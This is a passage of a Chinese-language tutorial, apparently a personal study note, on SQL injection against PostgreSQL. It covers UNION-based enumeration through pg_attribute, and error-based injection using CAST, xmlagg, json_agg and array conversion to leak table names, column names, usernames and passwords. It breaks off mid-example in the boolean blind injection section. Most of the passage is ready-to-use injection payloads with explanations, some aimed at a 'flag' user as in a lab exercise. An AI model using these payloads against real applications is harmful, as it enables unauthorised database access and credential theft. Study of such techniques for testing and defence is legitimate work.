+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">1</span>)<span class="number">-1</span><span class="string">&#x27; union select NULL,attname,NULL FROM pg_attribute WHERE attrelid=&#x27;</span>users<span class="string">&#x27;::regclass and attnum&gt;0 --</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">--------------------------------------------------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="string">(2)-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,column_name,data_type <span class="keyword">FROM</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> <span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+<p>![屏幕截图 2026-05-27 230043](D:\learn\web\note\屏幕截图 2026-05-27 230043.png)</p>
+<p><strong>释义：</strong></p>
+<ul>
+<li>1.<code>::</code> 在 PostgreSQL 中的含义</li>
+</ul>
+<p><code>::</code> 是 PostgreSQL 中的<strong>类型转换运算符</strong>（Type Cast Operator），用于将一个值从一种数据类型转换为另一种数据类型</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">值::目标数据类型</span><br></pre></td></tr></table></figure>
+
+<p>这等价于标准的 SQL 函数 <code>CAST(值 AS 目标数据类型)</code>。</p>
+<p>示例:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 字符串转整数</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;123&#x27;</span>::<span class="type">integer</span>;        <span class="comment">-- 结果：123</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">CAST</span>(<span class="string">&#x27;123&#x27;</span> <span class="keyword">AS</span> <span class="type">integer</span>); <span class="comment">-- 相同效果</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 整数转字符串</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="number">123</span>::<span class="type">varchar</span>;           <span class="comment">-- 结果：&#x27;123&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 字符串转日期</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;2024-01-01&#x27;</span>::<span class="type">date</span>;     <span class="comment">-- 结果：2024-01-01</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 小数转整数（截断）</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="number">12.34</span>::<span class="type">integer</span>;         <span class="comment">-- 结果：12</span></span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li><ol start="2">
+<li><code>&#39;users&#39;::regclass</code> —— 将表名转换成内部ID</li>
+</ol>
+</li>
+</ul>
+<p>(1) <code>&#39;users&#39;</code> 是一个普通的字符串，内容是表名 <code>users</code></p>
+<p>(2)  <code>::regclass</code> 是 PostgreSQL 的类型转换语法</p>
+<p>作用：把字符串 <code>&#39;users&#39;</code> <strong>转换成 PostgreSQL 内部的对象ID（OID）</strong></p>
+<blockquote>
+<p><strong>简单理解：</strong> 数据库内部有一个主表 <code>pg_class</code>，里面记录了所有表、索引等对象的编号（OID）。<code>&#39;users&#39;::regclass</code> 就是告诉数据库：“帮我找到 <code>users</code> 表对应的内部编号”。</p>
+</blockquote>
+<p>示例:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;users&#x27;</span>::regclass;</span><br></pre></td></tr></table></figure>
+
+<p>返回的结果可能是一个数字，比如 <code>24668</code>（这个数字是 <code>users</code> 表在数据库内部的唯一ID）。</p>
+<p>所以，<code>&#39;users&#39;::regclass</code> 实际上就<strong>返回了 <code>users</code> 表的内部OID(如下图)</strong> 。</p>
+<p><img src="/img/%E5%85%B6%E5%AE%83%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B3%A8%E5%85%A5/21.png"></p>
+<ul>
+<li><p>3.<code>WHERE attrelid=&#39;users&#39;::regclass AND attnum&gt;0</code></p>
+<p>这一句就是在做筛选：</p>
+<ul>
+<li><code>attrelid = &#39;users&#39;::regclass</code><br>只取“属于 <code>users</code> 表”的那些列。</li>
+<li><code>attnum &gt; 0</code><br>去掉系统内部的隐藏列（比如 <code>ctid</code>、<code>oid</code> 等），只保留我们真正关心的普通列。</li>
+</ul>
+<p><strong>如果不加 <code>attnum &gt; 0</code>，可能会返回 <code>tableoid</code>、<code>cmax</code> 等系统列，这些不是用户定义的列，我们一般不需要</strong></p>
+</li>
+</ul>
+<p><strong>获取所有数据</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">1</span>)<span class="number">-1</span><span class="string">&#x27; union select id,username,password from users --</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(2)-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> id,username <span class="operator">||</span> <span class="string">&#x27;:&#x27;</span> <span class="operator">||</span> password,<span class="keyword">NULL</span> <span class="keyword">from</span> users<span class="comment">--   使用字符串连接合并显示（当可显示列不足时）</span></span><br><span class="line"></span><br><span class="line">针对性获取</span><br><span class="line">(<span class="number">3</span>)<span class="number">-1</span><span class="string">&#x27; union select id,username,password from users where username=&#x27;</span>flag<span class="string">&#x27;--</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/%E5%85%B6%E5%AE%83%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B3%A8%E5%85%A5/22.png"></p>
+<h2 id="报错注入-1"><a href="#报错注入-1" class="headerlink" title="报错注入"></a>报错注入</h2><p><strong>前提:报错注入需要目标网站开启了报错提示</strong></p>
+<h3 id="类型转换报错注入"><a href="#类型转换报错注入" class="headerlink" title="类型转换报错注入"></a>类型转换报错注入</h3><p><strong>基础语法:</strong></p>
+<p>利用整数类型转换失败时，会在错误信息中显示无法转换的值(<strong>利用函数:cast()</strong>)</p>
+<p><strong>CAST()函数介绍:</strong></p>
+<p><code>CAST()</code> 是 SQL 标准中的<strong>类型转换函数</strong>，用于将一个数据类型转换为另一个数据类型。在报错注入中，我们利用的是<strong>强制类型转换失败时的错误信息</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">CAST</span>(表达式 <span class="keyword">AS</span> 目标数据类型)</span><br><span class="line"></span><br><span class="line">示例:</span><br><span class="line"><span class="comment">-- 将字符串转换为整数</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">CAST</span>(<span class="string">&#x27;123&#x27;</span> <span class="keyword">AS</span> <span class="type">INTEGER</span>);  <span class="comment">-- 结果：123</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;123&#x27;</span>::<span class="type">INTEGER</span>;          <span class="comment">-- 相同效果</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 将整数转换为字符串</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">CAST</span>(<span class="number">123</span> <span class="keyword">AS</span> <span class="type">VARCHAR</span>);     <span class="comment">-- 结果：&#x27;123&#x27;</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="number">123</span>::<span class="type">VARCHAR</span>;             <span class="comment">-- 相同效果</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 将字符串转换为日期</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">CAST</span>(<span class="string">&#x27;2024-01-01&#x27;</span> <span class="keyword">AS</span> <span class="type">DATE</span>);  <span class="comment">-- 结果：2024-01-01</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>报错注入的利用:</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 基础语法</span></span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="built_in">cast</span>((<span class="keyword">select</span> payload) <span class="keyword">as</span> <span class="type">int</span>)</span><br><span class="line"></span><br><span class="line">如果 payload查询到的结果 的值不是一个纯数字，比如最常见的数据库名 postgres、表名 users、用户名 admin、密码 flag&#123;xxx&#125; 等，那么 <span class="built_in">CAST</span>(<span class="string">&#x27;postgres&#x27;</span> <span class="keyword">AS</span> <span class="type">INT</span>) 就会失败，抛出错误，一旦转换失败，PostgreSQL 会立即停止执行并抛出一个错误，比如 ERROR: invalid input syntax <span class="keyword">for</span> <span class="type">integer</span>: &quot;postgres&quot;。这个错误信息中，恰好就包含了我们想查询的数据 postgres</span><br><span class="line"></span><br><span class="line"><span class="number">1</span><span class="operator">=</span> 的作用是将类型转换操作嵌入到一个完整的布尔表达式中，使其符合 <span class="keyword">WHERE</span> 子句的语法要求：<span class="built_in">CAST</span>(...) <span class="keyword">AS</span> <span class="type">INT</span> 本身不是一个布尔表达式，它返回的是一个整数类型的值。<span class="keyword">WHERE</span> 子句要求后面跟的是布尔表达式（结果为 <span class="literal">TRUE</span>、<span class="literal">FALSE</span> 或 <span class="keyword">NULL</span>）</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 实际示例：获取当前用户</span></span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="built_in">cast</span>((<span class="keyword">select</span> <span class="built_in">current_user</span>) <span class="keyword">AS</span> <span class="type">int</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>获取数据库版本:</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and 1=cast((select version()) AS int)--</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/%E5%85%B6%E5%AE%83%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B3%A8%E5%85%A5/23.png"></p>
+<p><strong>获取当前用户:</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and 1=cast((select current_user) AS int)--</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/%E5%85%B6%E5%AE%83%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B3%A8%E5%85%A5/24.png"></p>
+<p><strong>获取当前数据库名：</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and 1=cast((select current_database()) AS int)--</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/%E5%85%B6%E5%AE%83%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B3%A8%E5%85%A5/25.png"></p>
+<p><strong>获取表名</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">1</span>)<span class="number">1</span><span class="string">&#x27; and 1=cast((select tablename from pg_tables where schemaname=&#x27;</span>public<span class="string">&#x27;) AS int)--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(2)1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="built_in">cast</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;public&#x27;</span>) <span class="keyword">AS</span> <span class="type">int</span>)<span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/%E5%85%B6%E5%AE%83%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B3%A8%E5%85%A5/26.png"></p>
+<p><strong>获取列名</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">1</span>)<span class="number">1</span><span class="string">&#x27; and 1=cast((SELECT string_agg(attname, &#x27;</span>,<span class="string">&#x27;) FROM pg_attribute WHERE attrelid=&#x27;</span>users<span class="string">&#x27;::regclass AND attnum&gt;0) AS int)--</span></span><br><span class="line"><span class="string">由于报错注入不能多行回显，所里这里使用string_agg()函数将列名连接成一个字符串显示</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">--------------------------------------------------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="string">(2)1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="built_in">cast</span>((<span class="keyword">SELECT</span> string_agg(column_name <span class="operator">||</span> <span class="string">&#x27;:&#x27;</span> <span class="operator">||</span> data_type, <span class="string">&#x27;, &#x27;</span>) <span class="keyword">FROM</span> information_schema.columns <span class="keyword">WHERE</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>) <span class="keyword">AS</span> <span class="type">int</span>)<span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/%E5%85%B6%E5%AE%83%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B3%A8%E5%85%A5/27.png"></p>
+<p><code>string_agg() </code>函数介绍：</p>
+<p><code>tring_agg()</code> 是 PostgreSQL 中的<strong>字符串聚合函数</strong>，用于将多行数据的某个字段<strong>连接成一个字符串</strong>。在注入中非常实用，因为它能把多行结果合并成单行，满足报错注入”必须返回单值”的要求。</p>
+<p>基本语法:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">string_agg(要连接的字段, &#x27;分隔符&#x27;)</span><br><span class="line"></span><br><span class="line">string_agg(要连接的字段, &#x27;分隔符&#x27; ORDER BY 排序字段)</span><br><span class="line"></span><br><span class="line">这里是将列名用,连接成一个字符串输出(如上图报错结果)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p><strong>获取数据</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 获取所有用户名</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and 1=cast((SELECT string_agg(username, &#x27;</span>,<span class="string">&#x27;) FROM users) AS int)--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">--获取所有密码</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="built_in">cast</span>((<span class="keyword">SELECT</span> string_agg(password, <span class="string">&#x27;,&#x27;</span>) <span class="keyword">FROM</span> users) <span class="keyword">AS</span> <span class="type">int</span>)<span class="comment">--</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--同时获取用户名和密码</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and 1=cast((SELECT string_agg(username || &#x27;</span>:<span class="string">&#x27; || password, &#x27;</span> <span class="operator">|</span> <span class="string">&#x27;) FROM users) AS int)--</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/%E5%85%B6%E5%AE%83%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B3%A8%E5%85%A5/28.png"></p>
+<h3 id="XML-JSON函数报错"><a href="#XML-JSON函数报错" class="headerlink" title="XML&#x2F;JSON函数报错"></a>XML&#x2F;JSON函数报错</h3><p><strong>XML函数报错注入</strong></p>
+<p>（PostgreSQL 9.3+）</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- xmlagg 函数报错</span></span><br><span class="line"><span class="keyword">AND</span> <span class="number">1</span><span class="operator">=</span><span class="keyword">convert</span>(xmlagg(payload), text)::<span class="type">int</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- json 函数报错</span></span><br><span class="line"><span class="keyword">AND</span> <span class="number">1</span><span class="operator">=</span><span class="built_in">CAST</span>((<span class="keyword">SELECT</span> json_agg(payload)) <span class="keyword">AS</span> text)::<span class="type">int</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<ul>
+<li>第1层：<code>xmlagg(payload)</code></li>
+</ul>
+<p><code>xmlagg()</code> 是 PostgreSQL 的 <strong>XML 聚合函数</strong>，将多行数据聚合成一个 XML 文档</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 示例：假设 users 表有 &#x27;admin&#x27;, &#x27;test&#x27;, &#x27;bob&#x27;</span></span><br><span class="line"><span class="keyword">SELECT</span> xmlagg(xmlelement(name <span class="keyword">user</span>, username)) <span class="keyword">FROM</span> users;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>返回结果：</strong></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">user</span>&gt;</span>test<span class="tag">&lt;/<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">user</span>&gt;</span>bob<span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>第2层：<code>convert(xmlagg(...), text)</code></li>
+</ul>
+<p>将 XML 类型转换为文本字符串。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 转换后得到字符串</span></span><br><span class="line"><span class="string">&#x27;&lt;user&gt;admin&lt;/user&gt;&lt;user&gt;test&lt;/user&gt;&lt;user&gt;bob&lt;/user&gt;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>第3层：<code>::int</code> (或 <code>CAST(...AS int)</code>)</li>
+</ul>
+<p><strong>关键步骤：</strong> 将文本字符串强制转换为整数。</p>
+<p>由于字符串包含 <code>&lt;</code>、<code>&gt;</code>、字母等非数字字符，<strong>转换必然失败</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 执行时</span></span><br><span class="line"><span class="string">&#x27;&lt;user&gt;admin&lt;/user&gt;&#x27;</span>::<span class="type">int</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 报错</span></span><br><span class="line">ERROR: invalid input syntax <span class="keyword">for</span> <span class="type">integer</span>: &quot;&lt;user&gt;admin&lt;/user&gt;&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>相关payload:</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 获取表名</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND 1=((SELECT xmlagg(xmlelement(name t, table_name)) FROM information_schema.tables WHERE table_schema=&#x27;</span>public<span class="string">&#x27;))::text::int --</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 获取列名</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">AND</span> <span class="number">1</span><span class="operator">=</span>((<span class="keyword">SELECT</span> xmlagg(xmlelement(name c, column_name)) <span class="keyword">FROM</span> information_schema.columns <span class="keyword">WHERE</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>))::text::<span class="type">int</span> <span class="comment">--</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 获取 flag 密码</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND 1=((SELECT xmlelement(name flag, password) FROM users WHERE username=&#x27;</span>flag<span class="string">&#x27;))::text::int --</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><code>::text::int</code> 表示<strong>连续进行两次类型转换</strong>：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">值 ::text ::<span class="type">int</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>执行顺序：从右向左（或理解为逐步转换）</strong></p>
+<ol>
+<li>第一次转换：<code>值 ::text</code> → 将原值转换为文本字符串</li>
+<li>第二次转换：<code>结果 ::int</code> → 将文本字符串转换为整数</li>
+</ol>
+<p><img src="/img/%E5%85%B6%E5%AE%83%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B3%A8%E5%85%A5/29.png"></p>
+<hr>
+<p><strong>JSON函数报错注入</strong></p>
+<p>JSON 函数报错注入的原理是：<strong>利用 JSON 聚合函数将查询结果转换为 JSON 格式，然后强制转换为整数，导致类型转换错误，在错误信息中暴露数据</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-- 核心公式</span><br><span class="line">数据 → json_agg() → JSON数组 → ::text → 字符串 → ::int → ❌ 报错暴露数据</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>json_agg()函数介绍</strong></p>
+<p><code>json_agg()</code> - 聚合为 JSON 数组</p>
+<p>将多行数据聚合成一个 JSON 数组。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> json_agg(username) <span class="keyword">FROM</span> users;</span><br><span class="line"><span class="comment">-- 结果: [&quot;admin&quot;, &quot;test&quot;, &quot;bob&quot;]</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>报错原因</strong></p>
+<ul>
+<li>JSON 数组格式如 <code>[&quot;admin&quot;, &quot;test&quot;]</code> 包含 <code>[</code>、<code>]</code>、<code>&quot;</code> 等字符</li>
+<li>这些字符无法转换为整数</li>
+<li>数据库报错时会将完整的 JSON 字符串显示出来</li>
+</ul>
+<p><strong>相关payload</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--获取表名</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND 1=((SELECT json_agg(table_name) FROM information_schema.tables WHERE table_schema=&#x27;</span>public<span class="string">&#x27;))::text::int --</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">--获取列名</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">AND</span> <span class="number">1</span><span class="operator">=</span>((<span class="keyword">SELECT</span> json_agg(column_name) <span class="keyword">FROM</span> information_schema.columns <span class="keyword">WHERE</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>))::text::<span class="type">int</span> <span class="comment">--</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--获取数据</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND 1=((SELECT json_agg(json_build_object(&#x27;</span><span class="keyword">column</span><span class="string">&#x27;, column_name, &#x27;</span>type<span class="string">&#x27;, data_type)) FROM information_schema.columns WHERE table_name=&#x27;</span>users<span class="string">&#x27;))::text::int --</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/%E5%85%B6%E5%AE%83%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B3%A8%E5%85%A5/30.png"></p>
+<h3 id="数组转换错误"><a href="#数组转换错误" class="headerlink" title="数组转换错误"></a>数组转换错误</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 利用数组索引越界</span></span><br><span class="line"><span class="keyword">AND</span> <span class="number">1</span><span class="operator">=</span><span class="built_in">CAST</span>((<span class="keyword">SELECT</span> payload) <span class="keyword">AS</span> <span class="type">int</span>[])::<span class="type">int</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 示例</span></span><br><span class="line"><span class="keyword">AND</span> <span class="number">1</span><span class="operator">=</span><span class="built_in">CAST</span>((<span class="keyword">SELECT</span> <span class="built_in">current_user</span>) <span class="keyword">AS</span> <span class="type">int</span>[])::<span class="type">int</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>原理:</strong></p>
+<p>这个方法利用的是 <strong>PostgreSQL 数组类型转换时的边界检查错误</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">CAST</span>((<span class="keyword">SELECT</span> payload) <span class="keyword">AS</span> <span class="type">int</span>[])::<span class="type">int</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>执行流程：</strong></p>
+<ol>
+<li><p>将查询结果转换为 <code>int[]</code>（整数数组）</p>
+</li>
+<li><p>然后将数组转换为整数 <code>::int</code></p>
+</li>
+<li><p><strong>数组无法直接转换为整数，触发错误</strong></p>
+</li>
+</ol>
+<p><strong>相关payload</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--查表名</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND 1=((SELECT json_agg(table_name) FROM information_schema.tables WHERE table_schema=&#x27;</span>public<span class="string">&#x27;))::text::int --</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">--查列名</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">AND</span> <span class="number">1</span><span class="operator">=</span>((<span class="keyword">SELECT</span> json_agg(column_name) <span class="keyword">FROM</span> information_schema.columns <span class="keyword">WHERE</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>))::text::<span class="type">int</span> <span class="comment">--</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--获取数据</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND 1=((SELECT json_agg(json_build_object(&#x27;</span><span class="keyword">user</span><span class="string">&#x27;, username, &#x27;</span>pass<span class="string">&#x27;, password)) FROM users))::text::int --</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/%E5%85%B6%E5%AE%83%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B3%A8%E5%85%A5/31.png"></p>
+<h2 id="布尔盲注-1"><a href="#布尔盲注-1" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p><strong>字符串内容判断</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 判断第一个字符是否为 &#x27;a&#x27;</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND (SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=&#x27;</span>public<span class="string">&#x27; LIMIT 1), 1, 1)) = &#x27;</span>a<span class="string">&#x27; --</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 使用 ASCII 码判断</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">AND</span> ASCII(<span class="built_in">SUBSTRING</span>((<span class="keyword">SELECT</span> table_name <span 